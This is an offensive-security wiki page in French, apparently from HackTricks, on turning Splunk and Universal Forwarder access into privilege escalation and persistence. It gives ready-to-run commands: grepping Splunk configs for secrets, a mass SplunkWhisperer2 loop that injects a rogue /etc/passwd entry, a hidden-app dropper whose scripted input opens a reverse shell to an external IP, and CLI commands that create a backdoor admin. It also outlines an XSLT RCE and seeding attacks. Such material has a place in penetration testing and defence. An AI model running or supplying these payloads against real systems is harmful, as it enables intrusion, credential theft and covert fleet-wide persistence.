# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Si, en **énumérant** une machine **en interne** ou **en externe**, vous trouvez **Splunk en cours d'exécution** (généralement **8000** pour l'interface web et **8089** pour l'API de gestion), des identifiants valides peuvent souvent être transformés en **exécution de code** via l'installation d'applications, les scripted inputs ou des actions de gestion. Si Splunk s'exécute en tant que **root**, cela devient fréquemment une **élévation de privilèges** immédiate.

Si vous avez uniquement besoin de la surface d'attaque distante générique, de l'énumération ou du chemin RCE par upload d'application, consultez :

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Si vous êtes **déjà root** et que le service Splunk n'écoute pas uniquement sur localhost, vous pouvez également voler les **hashes de mots de passe Splunk**, récupérer des **secrets chiffrés** ou déployer une **application malveillante** afin de maintenir une persistence localement ou sur plusieurs forwarders.

## Fichiers locaux intéressants

Lorsque vous arrivez sur un hôte exécutant Splunk ou Splunk Universal Forwarder, les chemins suivants sont généralement les plus intéressants :
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifacts importants :

- **`$SPLUNK_HOME/etc/passwd`** : utilisateurs Splunk locaux et hashes de mots de passe.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`** : clé utilisée par Splunk pour chiffrer les secrets stockés dans plusieurs fichiers `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`** : fichier de bootstrap de l’administrateur initial ; utile dans les gold images et en cas d’erreurs de provisioning. Il est ignoré si `etc/passwd` existe déjà.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`** : emplacement où les scripted inputs sont généralement activés.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`** : bons emplacements pour dissimuler une app persistante ou vérifier ce qui est déjà distribué.

## Résumé de l’exploit de l’agent Splunk Universal Forwarder

Pour plus de détails, consultez [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ceci n’est qu’un résumé :

**Aperçu de l’exploit :**
Un exploit ciblant le Splunk Universal Forwarder (UF) permet aux attaquants disposant du **mot de passe de l’agent** d’exécuter du code arbitraire sur les systèmes exécutant l’agent, ce qui peut compromettre une grande partie de l’environnement.

**Pourquoi cela fonctionne :**

- Le service de management de l’UF est généralement exposé sur **TCP 8089**.
- Les attaquants peuvent s’authentifier auprès de l’API et demander au forwarder d’installer un **bundle d’app malveillant**.
- Le même primitive peut être utilisé localement pour une **LPE** ou à distance pour une **RCE**.
- Des outils publics comme **SplunkWhisperer2** créent automatiquement le bundle d’app et peuvent adapter les payloads aux cibles Linux.

**Méthodes courantes pour récupérer le mot de passe :**

- Identifiants en clair dans la documentation, les scripts, les shares ou l’automatisation du déploiement.
- Hashes de mots de passe dans `$SPLUNK_HOME/etc/passwd`, suivis d’un cracking offline.
- Gold images ou résidus de provisioning tels que `user-seed.conf`.

**Impact :**

- Exécution de code au niveau SYSTEM/root sur chaque hôte compromis.
- Déploiement d’apps persistantes, de backdoors ou de ransomware.
- Désactivation ou altération de la télémétrie avant le forwarding des données.

**Commande d’exemple pour l’exploitation :**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Si vous disposez d'un **accès en écriture au filesystem** en tant que `root`/`splunk`, ou d'un accès authentifié pour installer des apps, un mécanisme de persistence très fiable consiste à déposer une **custom app** contenant un **scripted input**. La documentation de Splunk indique elle-même que les scripted inputs doivent se trouver dans le répertoire d'une app et être activés depuis `inputs.conf`.

Structure typique :
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` minimal :
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper Linux rapide :
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes :

- Le même trick fonctionne sur **Universal Forwarder** en utilisant `/opt/splunkforwarder/etc/apps/`.
- Les attackers se fondent souvent dans le décor en modifiant un add-on légitime au lieu de créer une app manifestement malveillante.
- Sur un **deployment server**, placer une app malveillante dans `deployment-apps/` se transforme en **persistence à l’échelle de la flotte**, car les forwarders interrogent le serveur, téléchargent les apps mises à jour et redémarrent souvent pour les appliquer.

## Vol de credentials et prise de contrôle administrateur

Si vous pouvez lire les fichiers locaux de Splunk, il y a généralement deux objectifs intéressants : récupérer l’accès **admin à Splunk** et récupérer les **credentials de service chiffrés**.

### Hashs de mots de passe et utilisateurs locaux

Splunk stocke les données d’authentification locales dans `etc/passwd`. Selon le déploiement, le cracking de ce fichier peut permettre de récupérer des credentials fonctionnels pour l’interface web et l’API de gestion.

Si vous disposez déjà de credentials **admin** valides et que Splunk utilise son backend d’authentification **native**, le CLI lui-même peut être utilisé pour la persistence :
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` et les valeurs chiffrées

Splunk utilise `etc/auth/splunk.secret` pour protéger les valeurs sensibles stockées dans plusieurs fichiers de configuration. Si vous pouvez voler à la fois le **secret** et les fichiers **`.conf`** concernés, vous pouvez souvent récupérer ou rejouer :

- les secrets partagés forwarder/indexer tels que `pass4SymmKey`
- les mots de passe des clés privées TLS tels que `sslPassword`
- les identifiants de bind LDAP tels que `bindDNPassword`

Cela est utile pour le **lateral movement**, même lorsque le mot de passe de l’administrateur Splunk lui-même ne peut pas être cracké.

### Abus de `user-seed.conf`

`user-seed.conf` est utilisé uniquement lors du premier démarrage ou lorsque `etc/passwd` n’existe pas. Il est donc moins utile sur une machine active, mais particulièrement intéressant dans :

- les templates d’installation compromis
- les images de conteneurs
- les workflows de provisioning sans intervention
- les appliances où Splunk est automatiquement réinitialisé

Dans ces cas, placer un `HASHED_PASSWORD` généré avec `splunk hash-passwd` vous permet de récupérer discrètement l’accès administrateur après un redeployment.

## Abus des requêtes Splunk

Pour plus de détails, consultez [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Une technique récente utile consiste à exploiter le **XSLT fourni par l’utilisateur** dans les versions vulnérables de Splunk Enterprise afin de transformer un compte authentifié disposant de faibles privilèges en exécution de commandes **OS** avec l’utilisateur `splunk`.

Déroulement général :

1. S’authentifier auprès de Splunk.
2. Uploader un fichier **XSL** malveillant via la fonctionnalité de preview/upload.
3. Faire afficher à Splunk les résultats de recherche avec cette stylesheet uploadée depuis le répertoire **dispatch**.
4. Utiliser le payload XSLT pour écrire un fichier ou déclencher une exécution via le pipeline de recherche de Splunk, par exemple en atteignant une fonctionnalité interne telle que `runshellscript`.

Le point important pour l’offensive est que cette méthode permet une **RCE post-auth sans nécessiter d’app upload**. Sous Linux, elle vous donne généralement accès au compte **`splunk`**, ce qui reste utile, car cet utilisateur possède souvent l’arborescence de l’application, peut lire les secrets et peut installer des apps persistantes qui survivent à la perte du shell.

Un chemin représentatif utilisé pendant l’exploitation est :
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Si Splunk s’exécute avec trop de privilèges, ou si l’utilisateur `splunk` a accès à des scripts dangereux, à des unités de service modifiables ou à de mauvaises règles `sudo`, cela devient une chaîne **LPE** nette.

## Références

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
